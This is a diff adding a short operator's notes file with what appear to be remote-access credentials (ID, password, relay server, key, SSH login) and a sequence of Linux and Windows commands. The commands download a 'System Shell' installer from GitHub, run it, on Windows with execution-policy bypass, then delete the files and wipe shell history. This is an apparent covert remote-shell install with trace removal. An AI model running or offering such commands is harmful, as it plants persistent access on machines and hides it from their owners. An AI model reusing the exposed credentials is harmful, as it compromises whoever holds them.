@@ -1,0 +1,58 @@
+ID: 518 165 298
+Pass: biedeesh
+
+Settings Network:
+ID: 129.21.33.138
+Relay Server: 129.21.33.138
+Key: 3SLkCQnj7B6A1++0E3fZaN2M7MbusS82huuX+6bQBS8=
+
+----------------------------------------------------------------
+ssh falkan@IP
+
+joshua
+
+(sudo apt install curl)
+
+curl -L -o tools.zip https://github.com/Naor-Golan/tools/archive/refs/heads/main.zip
+
+(sudo apt install zip)
+
+unzip tools.zip 
+
+cd tools-main/
+
+cd Linux/
+
+chmod +x install-System-Shell.sh
+
+./install-System-Shell.sh
+
+cd ~
+
+rm -rf tools tools-main tools.zip
+
+ls
+
+history -c
+
+(shred -u ~/.bash_history)?
+
+exit
+
+
+-----------------------------------------------------
+
+Invoke-WebRequest -Uri https://github.com/Naor-Golan/tools/archive/refs/heads/main.zip -OutFile tools.zip
+
+Expand-Archive -Path tools.zip -DestinationPath . -Force
+
+cd tools-main\Windows
+
+powershell -ep bypass -f "Windows System Shell Service.ps1"
+
+cd ..\..
+
+Remove-Item -Recurse -Force tools.zip, tools-main
+
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-History
